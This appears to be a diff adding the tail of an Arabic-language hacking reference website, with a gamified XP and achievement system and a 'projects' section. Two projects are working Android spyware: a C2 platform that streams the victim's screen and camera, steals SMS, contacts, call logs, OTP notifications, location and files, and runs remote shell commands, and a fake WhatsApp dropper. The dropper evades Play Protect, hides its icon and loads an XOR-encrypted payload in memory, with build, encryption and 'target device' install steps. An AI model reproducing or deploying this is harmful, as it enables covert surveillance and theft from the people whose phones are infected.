+{tool:"K6",category:"misc",platform:"both",difficulty:"intermediate",desc:"Load testing",install:"# GitHub",command:"k6 run script.js"},
+{tool:"Tcpdump-Misc",category:"misc",platform:"both",difficulty:"intermediate",desc:"Packet capture",install:"pkg install tcpdump",note:"Root",command:"tcpdump -i any port 80"},
+{tool:"Ngrep-Misc",category:"misc",platform:"both",difficulty:"intermediate",desc:"grep network",install:"pkg install ngrep",command:"ngrep -d any password"},
+{tool:"Termshark",category:"misc",platform:"both",difficulty:"intermediate",desc:"Wireshark TUI",install:"# GitHub",command:"termshark -i wlan0"},
+{tool:"Ifstat",category:"misc",platform:"both",difficulty:"beginner",desc:"network stats",install:"pkg install ifstat",command:"ifstat -i wlan0"},
+{tool:"Speedtest",category:"misc",platform:"both",difficulty:"beginner",desc:"Speed test",install:"pip install speedtest-cli",command:"speedtest-cli"}
+
+];
+
+// ═══════════════════════════════════════════════════════
+// PROJECTS — المشاريع اللي بنيناها
+// ═══════════════════════════════════════════════════════
+const PROJECTS = [
+{id:'ahmed-cia47',icon:'👽',name:'Ahmed CIA 47 — C2 Command Center',tagline:'منصة C2 كاملة مع agent أندرويد ولوحة ويب',difficulty:'legendary',status:'working',
+summary:'سيرفر Python + لوحة تحكم احترافية + تطبيق أندرويد يتصل من أي شبكة. بث شاشة، كاميرا، SMS، موقع، ملفات، shell.',
+features:['لوحة تحكم ويب بتصميم داكن احترافي','بث شاشة مباشر Live streaming عبر WebSocket','بث كاميرا (أمامية + خلفية)','قراءة SMS + جهات الاتصال + سجل المكالمات','موقع GPS على خريطة تفاعلية','تتبع موقع تلقائي كل 10 دقايق','مراقبة إشعارات كل التطبيقات (OTP stealer)','تنفيذ أوامر Shell عن بعد','تصفح وتنزيل ملفات الضحية','صورة صامتة بالكاميرا','يعمل بعد إعادة التشغيل','APK موقّع بمفتاح ثابت','يشتغل من أي شبكة عبر serveo tunnel'],
+requirements:['Python 3.10+ على Termux','aiohttp','ssh client','جهاز أندرويد للإختبار','حساب GitHub للبناء التلقائي'],
+structure:`ahmedcia47/
+├── server/
+│   ├── server.py
+│   ├── c2.db
+│   ├── .api_key
+│   ├── stage2.bin
+│   ├── uploads/
+│   └── static/
+│       ├── index.html
+│       └── logo.svg
+
+AhmedCIA47/
+├── app/src/main/
+│   ├── java/com/ahmed/cia47/
+│   │   ├── App.kt
+│   │   ├── App2.kt
+│   │   ├── Config.kt
+│   │   ├── C2.kt
+│   │   ├── Http.kt
+│   │   ├── Beacon.kt
+│   │   ├── Cmd.kt
+│   │   ├── Loc.kt
+│   │   ├── Shot.kt
+│   │   ├── ScrCast.kt
+│   │   ├── CamCast.kt
+│   │   └── Main.kt
+│   └── AndroidManifest.xml
+└── .github/workflows/build.yml`,
+steps:[
+{title:'تجهيز Termux',commands:['pkg update -y && pkg upgrade -y','pkg install -y python git openssh','pip install aiohttp','termux-wake-lock']},
+{title:'إنشاء مجلد السيرفر',commands:['mkdir -p ~/ahmedcia47/server/static','cd ~/ahmedcia47/server','touch .api_key']},
+{title:'نسخ ملفات السيرفر',note:'انسخ server.py + static/index.html + static/logo.svg',commands:['ls -la ~/ahmedcia47/server/']},
+{title:'تشغيل السيرفر',note:'هيطبعلك API Key — احفظه',commands:['cd ~/ahmedcia47/server','python server.py']},
+{title:'تشغيل النفق (نافذة تانية)',note:'هيطلعلك رابط https://ahmedcia47.serveousercontent.com',commands:['pkill -9 ssh 2>/dev/null','nohup ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=30 \\','  -R ahmedcia47:80:localhost:8443 serveo.net > ~/tunnel.log 2>&1 &','sleep 12','cat ~/tunnel.log']},
+{title:'بناء APK عبر GitHub Actions',note:'استنى 3-5 دقايق → Actions → نزّل APK',commands:['cd ~/AhmedCIA47','git init && git add .','git commit -m "init"','git branch -M main','git remote add origin https://github.com/USER/AhmedCIA47.git','git push -u origin main']},
+{title:'فتح اللوحة',commands:['# محلياً:','http://127.0.0.1:8443/?key=YOUR_KEY','# من أي مكان:','https://ahmedcia47.serveousercontent.com/?key=YOUR_KEY']}
+],
+usages:[{cmd:'ping',desc:'اختبار الاتصال'},{cmd:'shell {"cmd":"id"}',desc:'تنفيذ أمر شل'},{cmd:'location',desc:'الموقع الحالي'},{cmd:'sms_list',desc:'قراءة الرسائل'},{cmd:'contacts',desc:'جهات الاتصال'},{cmd:'call_log',desc:'سجل المكالمات'},{cmd:'files_list {"path":"/sdcard"}',desc:'سرد ملفات'},{cmd:'file_download {"path":"..."}',desc:'تنزيل ملف'},{cmd:'camera_photo',desc:'صورة بالكاميرا'},{cmd:'screen_start / screen_stop',desc:'بث الشاشة'},{cmd:'camera_start / camera_stop',desc:'بث الكاميرا'},{cmd:'device_info',desc:'معلومات الجهاز'},{cmd:'apps_list',desc:'التطبيقات المثبتة'},{cmd:'clipboard',desc:'الحافظة'}]},
+{id:'wa-dropper',icon:'💬',name:'WhatsApp Dropper',tagline:'APK نظيف يعدي Play Protect ويحمّل payload من السيرفر',difficulty:'expert',status:'working',
+summary:'تطبيق أندرويد بحجم صغير على شكل WhatsApp، إذن INTERNET فقط. عند التشغيل يحمّل classes.dex مشفّر من السيرفر ويفك تشفيره في الذاكرة ويشغّله.',
+features:['الـ APK نظيف — إذن INTERNET فقط','يعدي Google Play Protect بدون تحذير','يحمّل DEX مشفّر (XOR) من السيرفر','يفك التشفير في الذاكرة (InMemoryDexClassLoader)','يشغّل Stage2 بدون تثبيت','يخفي أيقونته بعد التشغيل','واجهة تشبه WhatsApp أثناء التحميل'],
+requirements:['السيرفر شغال','ملف stage2.bin (classes.dex مشفّر)','Android 8+'],
+structure:`AhmedDropper/
+├── app/src/main/java/com/whatsapp/web/
+│   ├── App.kt
+│   ├── Cfg.kt
+│   ├── Loader.kt
+│   └── Splash.kt
+├── app/src/main/res/drawable/ic_launcher.xml
+└── app/src/main/AndroidManifest.xml`,
+steps:[
+{title:'الحصول على classes.dex',commands:['mkdir -p ~/apk_work ~/extract_s2','cd ~/apk_work','unzip -o AhmedCIA47-apk.zip','cd ~/extract_s2','unzip -o ~/apk_work/app-release.apk "classes*.dex"','ls -la classes.dex']},
+{title:'تشفير الـ DEX → stage2.bin',commands:['python3 << "EOF"','KEY = b"WA_stage2_xor_2026"','src = "/data/data/com.termux/files/home/extract_s2/classes.dex"','dst = "/data/data/com.termux/files/home/ahmedcia47/server/stage2.bin"','data = open(src, "rb").read()','out = bytearray(len(data))','for i in range(len(data)):','    out[i] = data[i] ^ KEY[i % len(KEY)]','open(dst, "wb").write(out)','print(f"stage2.bin = {len(out)} bytes")','EOF']},
+{title:'تأكد إن السيرفر يقدّم stage2',commands:['curl -s -o /dev/null -w "%{size_download} bytes\\n" http://127.0.0.1:8443/stage2.bin']},
+{title:'بناء Dropper APK',commands:['cd ~/AhmedDropper','git init && git add .','git commit -m "dropper v1"','git branch -M main','git remote add origin https://github.com/USER/WhatsApp-Web.git','git push -u origin main']},
+{title:'التثبيت على الجهاز الهدف',note:'اقفل النت → ثبّت → رجّع النت → افتح التطبيق',commands:['# 1. اقفل Wi-Fi + Data','# 2. ثبّت الـ APK','# 3. رجّع النت','# 4. افتح التطبيق','# 5. وافق على الأذونات']}
+],
+usages:[{cmd:'افتح اللوحة',desc:'الجهاز يظهر خلال 15 ثانية'},{cmd:'اختبر ping',desc:'للتأكد من الاتصال'},{cmd:'device_info',desc:'معلومات الجهاز'}]},
+{id:'vantascan',icon:'🔍',name:'VantaScan — Web Vulnerability Scanner',tagline:'ماسح ثغرات ويب بـ Signal Fusion + Attack Chain Graph',difficulty:'advanced',status:'working',
+summary:'سكانر Python async متعدد المكونات: يفحص 10+ أنواع ثغرات مع دمج الإشارات الضعيفة في finding قوي، ورسم سلسلة هجوم كاملة.',
+features:['SQLi (error/boolean/time-based)','XSS reflected + context detection','LFI (Linux + Windows + PHP filter)','SSRF (internal + canary)','Open Redirect','CORS misconfiguration','Security headers audit','JWT weaknesses','Exposed files (.git, .env)','Signal Fusion','Attack Chain Graph','WAF detection + evasion','Authentication + session reuse','Subdomain enumeration','HTML report تفاعلي'],
+requirements:['Python 3.9+','aiohttp beautifulsoup4 rich'],
+structure:`vantascan/
+├── __main__.py
+├── cli.py
+├── core/
+│   ├── scanner.py http.py signals.py
+│   ├── diff.py inject.py plugin.py
+│   ├── correlator.py graph.py store.py
+│   ├── crawl.py evasion.py waf.py
+│   └── auth.py subdomains.py report.py
+└── plugins/
+    ├── sqli.py xss.py lfi.py ssrf.py
+    └── redirect.py cors.py headers.py
+        disclosure.py methods.py jwt.py`,
+steps:[
+{title:'التثبيت',commands:['pkg install -y python git','pip install aiohttp beautifulsoup4 rich']},
+{title:'نسخ المشروع',commands:['cd ~','git clone https://github.com/USER/vantascan.git','cd vantascan','python -m vantascan --help']},
+{title:'فحص أساسي',commands:['python -m vantascan http://testphp.vulnweb.com --depth 2 --max-pages 40 --rate 3 --html report.html']},
+{title:'فحص متقدم',commands:['python -m vantascan https://target.com --depth 3 --waf-detect --waf-evade 2 --time-based --subdomains --html report.html']},
+{title:'فتح التقرير',commands:['termux-open report.html']}
+],
+usages:[{cmd:'--depth N',desc:'عمق الزحف'},{cmd:'--waf-detect',desc:'كشف WAF'},{cmd:'--waf-evade 0-3',desc:'مستوى التخطي'},{cmd:'--time-based',desc:'SQLi بالوقت'},{cmd:'--login-url + --login-user/pass',desc:'فحص بعد دخول'},{cmd:'--subdomains',desc:'اكتشاف نطاقات فرعية'},{cmd:'--html report.html',desc:'تقرير HTML'}]},
+{id:'worm-c2',icon:'🪱',name:'WORM-C2 — Command Server',tagline:'النسخة الأولى — سيرفر C2 بسيط للتعلم',difficulty:'intermediate',status:'working',
+summary:'سيرفر C2 مبسط بـ aiohttp، لوحة HTML نظيفة، للتعلم وفهم كيف يعمل أي C2.',
+features:['REST API كامل','SQLite storage','WebSocket للبث','لوحة تحكم HTML','Agent Android (Kotlin)'],
+requirements:['Python 3.10+','aiohttp'],
+structure:`worm-c2/
+├── server/main.py
+└── agent/ (Android)`,
+steps:[{title:'التشغيل',note:'هيطبعلك API Key — افتح localhost:8443',commands:['cd ~/worm-c2/server','python main.py']}],
+usages:[{cmd:'GET /api/devices',desc:'كل الأجهزة'},{cmd:'POST /api/command',desc:'إرسال أمر'},{cmd:'WS /ws/agent',desc:'بث مباشر'}]},
+{id:'site',icon:'🌐',name:'Ahmed CIA 47 — Reference Site',tagline:'موقع مرجعي للأدوات + نظام XP ومستويات',difficulty:'beginner',status:'working',
+summary:'الموقع اللي بتتصفحه — 1050 أداة في 25 قسم، نظام XP، إنجازات، ومسارات تعلم.',
+features:['1050 أداة في 25 قسم','نظام XP ومستويات (10 مستويات)','إنجازات قابلة للفتح','مسارات تعلم جاهزة','بحث ذكي','نسخ الأوامر بضغطة واحدة','progress محفوظ في المتصفح','يشتغل offline'],
+requirements:['متصفح فقط — لا يحتاج سيرفر'],
+structure:`ahmed-cia47-site/
+└── index.html (ملف واحد شامل)`,
+steps:[
+{title:'التشغيل محلياً',commands:['# احفظ الملف','# افتح index.html في المتصفح']},
+{title:'النشر على GitHub Pages',commands:['git init','git add .','git commit -m "site"','git branch -M main','git remote add origin https://github.com/USER/site.git','git push -u origin main','# Settings → Pages → Deploy from main']}
+],
+usages:[{cmd:'tab الأدوات',desc:'تصفح مع فلترة'},{cmd:'tab ترسانتنا',desc:'كل مشاريعنا'},{cmd:'tab مسارات التعلم',desc:'خطط جاهزة'},{cmd:'tab الإنجازات',desc:'إنجازاتك'},{cmd:'tab الإحصائيات',desc:'تقدمك'}]}
+];
+
+// ═══════════════════════════════════════════════════════
+// CORE LOGIC
+// ═══════════════════════════════════════════════════════
+const TIERS=[
+{level:1,name:'مبتدئ',icon:'🥚',minXP:0},
+{level:2,name:'متدرب',icon:'📚',minXP:200},
+{level:3,name:'مستطلع',icon:'🔍',minXP:600},
+{level:4,name:'مخترق ويب',icon:'⚔️',minXP:1200},
+{level:5,name:'مخترق شبكات',icon:'🎯',minXP:2000},
+{level:6,name:'متجاوز حمايات',icon:'🛡️',minXP:3200},
+{level:7,name:'صائد ثغرات',icon:'👑',minXP:4800},
+{level:8,name:'مخترق نخبة',icon:'💀',minXP:7000},
+{level:9,name:'أسطورة',icon:'🔥',minXP:10000},
+{level:10,name:'أحمد CIA 47',icon:'👽',minXP:15000}];
+
+const XP_MAP={beginner:5,intermediate:15,advanced:30,expert:60,legendary:120};
+
+const CATS=[
+{id:'all',name:'جميع الأقسام'},
+{id:'recon',name:'🔍 استطلاع'},
+{id:'web',name:'🌐 ويب'},
+{id:'wifi',name:'📡 لاسلكي'},
+{id:'password',name:'🔑 كلمات مرور'},
+{id:'exploit',name:'💥 استغلال'},
+{id:'post',name:'🎯 بعد الاستغلال'},
+{id:'network',name:'🌉 شبكة'},
+{id:'osint',name:'🕵️ OSINT'},
+{id:'crypto',name:'🔐 تشفير'},
+{id:'forensics',name:'🔬 طب شرعي'},
+{id:'reverse',name:'⚙️ هندسة عكسية'},
+{id:'mobile',name:'📱 موبايل'},
+{id:'cloud',name:'☁️ سحابة'},
+{id:'ad',name:'🏢 Active Directory'},
+{id:'se',name:'🎭 هندسة اجتماعية'},
+{id:'hardware',name:'🔌 هاردوير/IoT'},
+{id:'c2',name:'🎛️ C2 Frameworks'},
+{id:'web3',name:'⛓️ Web3/Crypto'},
+{id:'misc',name:'🔧 أدوات عامة'}];
+
+const ACHS=[
+{id:'first',icon:'🎯',name:'أول خطوة',desc:'أكمل أول أداة',check:s=>s.count>=1},
+{id:'ten',icon:'🔟',name:'10 أدوات',desc:'أكمل 10',check:s=>s.count>=10},
+{id:'fifty',icon:'⚡',name:'خمسين',desc:'أكمل 50',check:s=>s.count>=50},
+{id:'hundred',icon:'💯',name:'مئة',desc:'أكمل 100',check:s=>s.count>=100},
+{id:'two-fifty',icon:'🚀',name:'250 أداة',desc:'أكمل 250',check:s=>s.count>=250},
+{id:'five-hundred',icon:'⭐',name:'500 أداة',desc:'أكمل 500',check:s=>s.count>=500},
+{id:'thousand',icon:'💎',name:'أسطورة الأدوات',desc:'أكمل 1000 أداة',check:s=>s.count>=1000},
+{id:'recon20',icon:'🔍',name:'عين الصقر',desc:'20 أداة استطلاع',check:s=>(s.byCat.recon||0)>=20},
+{id:'web30',icon:'⚔️',name:'محارب الويب',desc:'30 أداة ويب',check:s=>(s.byCat.web||0)>=30},
+{id:'exploit15',icon:'💥',name:'مستغل محترف',desc:'15 أداة استغلال',check:s=>(s.byCat.exploit||0)>=15},
+{id:'level5',icon:'🎖️',name:'مخترق شبكات',desc:'وصل للمستوى 5',check:s=>s.tier.level>=5},
+{id:'level7',icon:'👑',name:'صائد ثغرات',desc:'وصل للمستوى 7',check:s=>s.tier.level>=7},
+{id:'level10',icon:'👽',name:'أسطورة',desc:'وصل للقمة',check:s=>s.tier.level>=10},
+{id:'legendary',icon:'🔥',name:'أسطوري',desc:'أكمل أداة أسطورية',check:s=>s.legendary>=1},
+{id:'half',icon:'🌟',name:'نصف الطريق',desc:'50% إنجاز',check:s=>s.percent>=50}];
+
+const PATHS=[
+{name:'🥚 مسار المبتدئ',cats:['recon','web','password','misc'],target:40},
+{name:'⚔️ مسار اختبار الويب',cats:['web','recon','crypto'],target:60},
+{name:'📡 مسار اللاسلكي',cats:['wifi','network','hardware'],target:40},
+{name:'🎯 مسار Red Teamer',cats:['exploit','post','ad','network','c2'],target:80},
+{name:'🔬 مسار Forensic',cats:['forensics','reverse','crypto'],target:50},
+{name:'🏢 مسار AD Expert',cats:['ad','exploit','post'],target:50},
+{name:'👑 مسار الأسطورة',cats:['recon','web','wifi','password','exploit','post','ad','reverse','osint','crypto','forensics','mobile','cloud','network','se','hardware','c2','web3'],target:1000}];
+
+let state={
+mastered:JSON.parse(localStorage.getItem('cia47_mastered')||'[]'),
+currentCategory:'all',
+currentPlatform:'all',
+currentDiff:'all',
+currentStatus:'all',
+searchQuery:''
+};
+
+function save(){localStorage.setItem('cia47_mastered',JSON.stringify(state.mastered))}
+function isM(t){return state.mastered.includes(t)}
+
+function getStats(){
+let xp=0,legendary=0;const byCat={};
+TOOLS.forEach(t=>{if(isM(t.tool)){xp+=XP_MAP[t.difficulty]||5;byCat[t.category]=(byCat[t.category]||0)+1;if(t.difficulty==='legendary')legendary++}});
+const tier=[...TIERS].reverse().find(t=>xp>=t.minXP)||TIERS[0];
+const nextTier=TIERS.find(t=>t.minXP>xp);
+return{total:TOOLS.length,count:state.mastered.length,xp,tier,nextTier,percent:TOOLS.length?Math.round(state.mastered.length/TOOLS.length*100):0,byCat,legendary};
+}
+
+function renderProgress(){
+const s=getStats();
+document.getElementById('levelIcon').textContent=s.tier.icon;
+document.getElementById('levelName').textContent=s.tier.name;
+document.getElementById('levelNum').textContent=s.tier.level;
+document.getElementById('xpValue').textContent=s.xp+' XP';
+if(s.nextTier){
+document.getElementById('xpTarget').textContent='التالي: '+s.nextTier.minXP+' XP';
+const range=s.nextTier.minXP-s.tier.minXP;
+const p=(s.xp-s.tier.minXP)/range*100;
+document.getElementById('progressFill').style.width=Math.min(p,100)+'%';
+}else{
+document.getElementById('xpTarget').textContent='🎉 وصلت للقمة';
+document.getElementById('progressFill').style.width='100%';
+}
+document.getElementById('mastered').textContent=s.count;
+document.getElementById('totalTools').textContent=s.total;
+document.getElementById('percent').textContent=s.percent+'%';
+document.getElementById('achieveCount').textContent=ACHS.filter(a=>a.check(s)).length;
+}
+
+function renderCats(){
+const el=document.getElementById('categoryFilters');el.innerHTML='';
+CATS.forEach(c=>{
+const b=document.createElement('button');
+b.className='cat-btn'+(c.id===state.currentCategory?' active':'');
+b.textContent=c.name;
+b.onclick=()=>{state.currentCategory=c.id;renderCats();renderTools()};
+el.appendChild(b);
+});
+}
+
+function esc(s){return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]))}
+
+function renderTools(){
+const grid=document.getElementById('toolsGrid');
+const empty=document.getElementById('emptyState');
+grid.innerHTML='';
+const q=state.searchQuery.toLowerCase();
+const filtered=TOOLS.filter(t=>{
+if(state.currentCategory!=='all'&&t.category!==state.currentCategory)return false;
+if(state.currentPlatform!=='all'&&t.platform!=='both'&&t.platform!==state.currentPlatform)return false;
+if(state.currentDiff!=='all'&&t.difficulty!==state.currentDiff)return false;
+if(state.currentStatus==='done'&&!isM(t.tool))return false;
+if(state.currentStatus==='locked'&&isM(t.tool))return false;
+if(q){const hay=(t.tool+t.desc+t.command+(t.install||'')).toLowerCase();if(!hay.includes(q))return false}
+return true;
+});
+if(!filtered.length){empty.style.display='block';return}
+empty.style.display='none';
+filtered.forEach(t=>{
+const card=document.createElement('div');
+const done=isM(t.tool);
+card.className='tool-card'+(done?' done':'');
+card.dataset.diff=t.difficulty;
+const xp=XP_MAP[t.difficulty]||5;
+const note=t.note?'<div style="color:#e8b931;font-size:11px;margin-top:6px">⚠ '+esc(t.note)+'</div>':'';
+card.innerHTML='<div class="tool-head"><div class="tool-name">'+esc(t.tool)+'</div><div class="tool-badges"><span class="tool-badge diff-'+t.difficulty+'">'+t.difficulty+'</span><span class="tool-xp">+'+xp+' XP</span></div></div><div class="tool-desc">'+esc(t.desc)+'</div><div class="code-box"><code>'+esc(t.install||'—')+'</code><button class="copy-btn"><i class="fa-regular fa-copy"></i></button></div><div class="code-box"><code>'+esc(t.command||'—')+'</code><button class="copy-btn"><i class="fa-regular fa-copy"></i></button></div>'+note+'<div class="tool-actions"><button class="master-btn" data-tool="'+esc(t.tool)+'"><i class="fa-solid fa-'+(done?'check':'plus')+'"></i>'+(done?'متقنة ✓':'أتقنتها')+'</button></div>';
+grid.appendChild(card);
+});
+}
+
+function renderAch(){
+const s=getStats();
+const el=document.getElementById('achievementsGrid');el.innerHTML='';
+ACHS.forEach(a=>{
+const u=a.check(s);
+const c=document.createElement('div');
+c.className='ach-card '+(u?'unlocked':'locked');
+c.innerHTML='<div class="ach-icon">'+a.icon+'</div><div class="ach-name">'+a.name+'</div><div class="ach-desc">'+a.desc+'</div>';
+el.appendChild(c);
+});
+}
+
+function renderPaths(){
+const el=document.getElementById('pathsGrid');el.innerHTML='';
+PATHS.forEach(p=>{
+const catTools=TOOLS.filter(t=>p.cats.includes(t.category));
+const done=catTools.filter(t=>isM(t.tool)).length;
+const target=Math.min(p.target,catTools.length);
+const percent=target?Math.round(done/target*100):0;
+const c=document.createElement('div');
+c.className='path-card';
+c.innerHTML='<h3>'+p.name+'</h3><p>'+done+' من '+target+' أداة مكتملة</p><div class="path-progress"><div style="width:'+percent+'%"></div></div><div class="path-meta"><span>'+percent+'% مكتمل</span><span>'+(catTools.length-done)+' متبقية</span></div>';
+el.appendChild(c);
+});
+}
+
+function renderStats(){
+const s=getStats();
+const el=document.getElementById('statsPanel');
+const rows=CATS.filter(c=>c.id!=='all').map(c=>{
+const catTools=TOOLS.filter(t=>t.category===c.id);
+if(!catTools.length)return '';
+const done=catTools.filter(t=>isM(t.tool)).length;
+return '<div class="stat-box"><div class="value">'+done+'/'+catTools.length+'</div><div class="label">'+c.name+'</div></div>';
+}).join('');
+el.innerHTML='<div class="stat-box"><div class="value">'+s.count+'</div><div class="label">أدوات متقنة</div></div><div class="stat-box"><div class="value">'+s.xp+'</div><div class="label">XP الإجمالي</div></div><div class="stat-box"><div class="value">'+s.tier.level+'</div><div class="label">المستوى</div></div><div class="stat-box"><div class="value">'+s.percent+'%</div><div class="label">نسبة الإنجاز</div></div>'+rows;
+}
+
+function renderArsenal(){
+const el=document.getElementById('arsenalGrid');
+if(!el)return;
+el.innerHTML='';
+PROJECTS.forEach(p=>{
+const c=document.createElement('div');
+c.className='arsenal-card';
+c.dataset.diff=p.difficulty;
+const xp=XP_MAP[p.difficulty]||50;
+c.innerHTML='<div class="arsenal-icon">'+p.icon+'</div><div class="arsenal-body"><div class="arsenal-head"><h3>'+esc(p.name)+'</h3><span class="status-badge working">✅ يعمل</span></div><p class="arsenal-tag">'+esc(p.tagline)+'</p><p class="arsenal-sum">'+esc(p.summary)+'</p><div class="arsenal-meta"><span class="tool-badge diff-'+p.difficulty+'">'+p.difficulty+'</span><span class="tool-xp">+'+xp+' XP</span><span class="arsenal-count">'+p.features.length+' ميزة</span><span class="arsenal-count">'+p.steps.length+' خطوة</span></div></div>';
+c.onclick=()=>openProject(p);
+el.appendChild(c);
+});
+}
+
+function openProject(p){
+document.getElementById('arsenalGrid').style.display='none';
+const d=document.getElementById('projectDetail');
+d.style.display='block';
+let stepsHtml='';
+p.steps.forEach((s,i)=>{
+const cmds=s.commands.map(c=>'<div class="code-line"><code>'+esc(c)+'</code><button class="copy-line"><i class="fa-regular fa-copy"></i></button></div>').join('');
+const note=s.note?'<div class="step-note">💡 '+esc(s.note)+'</div>':'';
+stepsHtml+='<div class="proj-step"><div class="step-head"><span class="step-num">'+(i+1)+'</span><span class="step-title">'+esc(s.title)+'</span></div><div class="step-cmds">'+cmds+'</div>'+note+'</div>';
+});
+const usageHtml=p.usages?'<div class="proj-section"><h4>🖥️ الأوامر والاستخدامات</h4><div class="usage-grid">'+p.usages.map(u=>'<div class="usage-item"><div class="usage-cmd"><code>'+esc(u.cmd)+'</code></div><div class="usage-desc">'+esc(u.desc)+'</div></div>').join('')+'</div></div>':'';
+const reqsHtml=p.requirements?'<div class="proj-section"><h4>📋 المتطلبات</h4><ul class="req-list">'+p.requirements.map(r=>'<li>'+esc(r)+'</li>').join('')+'</ul></div>':'';
+const featHtml='<div class="proj-section"><h4>✨ الميزات</h4><ul class="feat-list">'+p.features.map(f=>'<li>'+esc(f)+'</li>').join('')+'</ul></div>';
+d.innerHTML='<button class="back-btn" onclick="closeProject()"><i class="fa-solid fa-arrow-right"></i> رجوع</button><div class="project-header"><div class="ph-icon">'+p.icon+'</div><div><h2>'+esc(p.name)+'</h2><p class="ph-tag">'+esc(p.tagline)+'</p><div class="ph-meta"><span class="tool-badge diff-'+p.difficulty+'">'+p.difficulty+'</span><span>✅ يعمل</span></div></div></div><div class="proj-summary">'+esc(p.summary)+'</div>'+featHtml+reqsHtml+'<div class="proj-section"><h4>📁 هيكل الملفات</h4><pre class="structure-pre">'+esc(p.structure)+'</pre></div><div class="proj-section"><h4>🚀 خطوات التشغيل</h4>'+stepsHtml+'</div>'+usageHtml+'<div class="proj-footer"><button class="back-btn large" onclick="closeProject()"><i class="fa-solid fa-arrow-right"></i> رجوع</button></div>';
+d.scrollIntoView({behavior:'smooth',block:'start'});
+}
+
+function closeProject(){
+document.getElementById('arsenalGrid').style.display='grid';
+document.getElementById('projectDetail').style.display='none';
+}
+
+let toastTimer;
+function showToast(msg){
+const t=document.getElementById('toast');
+t.innerHTML='<span class="ico">🏆</span><span>'+esc(msg)+'</span>';
+t.classList.add('show');
+clearTimeout(toastTimer);
+toastTimer=setTimeout(()=>t.classList.remove('show'),3000);
+}
+
+document.addEventListener('click',e=>{
+const mb=e.target.closest('.master-btn');
+if(mb){
+const tool=mb.dataset.tool;
+const was=isM(tool);
+if(was)state.mastered=state.mastered.filter(x=>x!==tool);
+else state.mastered.push(tool);
+save();
+renderProgress();renderTools();renderAch();renderPaths();renderStats();
+const td=TOOLS.find(x=>x.tool===tool);
+if(!was&&td)showToast('🎉 +'+XP_MAP[td.difficulty]+' XP — '+tool);
+return;
+}
+const cb=e.target.closest('.copy-btn,.copy-line');
+if(cb){
+const box=cb.closest('.code-box,.code-line');
+const code=box.querySelector('code');
+const text=code.textContent;
+const done=()=>{
+const i=cb.querySelector('i');
+const old=i.className;
+i.className='fa-solid fa-check';
+i.style.color='#10b981';
+setTimeout(()=>{i.className=old;i.style.color=''},1500);
+};
+if(navigator.clipboard&&window.isSecureContext){
+navigator.clipboard.writeText(text).then(done).catch(()=>{});
+}else{
+const ta=document.createElement('textarea');
+ta.value=text;document.body.appendChild(ta);
+ta.select();document.execCommand('copy');
+document.body.removeChild(ta);done();
+}
+}
+});
+
+document.querySelectorAll('.tab').forEach(tab=>{
+tab.onclick=()=>{
+document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
+document.querySelectorAll('.tab-content').forEach(t=>t.classList.remove('active'));
+tab.classList.add('active');
+document.getElementById('tab-'+tab.dataset.tab).classList.add('active');
+};
+});
+
+document.querySelectorAll('[data-platform]').forEach(b=>{
+b.onclick=()=>{
+document.querySelectorAll('[data-platform]').forEach(x=>x.classList.remove('active'));
+b.classList.add('active');state.currentPlatform=b.dataset.platform;renderTools();
+};
+});
+document.querySelectorAll('[data-diff]').forEach(b=>{
+b.onclick=()=>{
+document.querySelectorAll('[data-diff]').forEach(x=>x.classList.remove('active'));
+b.classList.add('active');state.currentDiff=b.dataset.diff;renderTools();
+};
+});
+document.querySelectorAll('[data-status]').forEach(b=>{
+b.onclick=()=>{
+document.querySelectorAll('[data-status]').forEach(x=>x.classList.remove('active'));
+b.classList.add('active');state.currentStatus=b.dataset.status;renderTools();
+};
+});
+document.getElementById('searchInput').addEventListener('input',e=>{
+state.searchQuery=e.target.value;renderTools();
+});
+
+renderProgress();
+renderCats();
+renderTools();
+renderAch();
+renderPaths();
+renderStats();
+renderArsenal();
+</script>
+</body>
+</html>
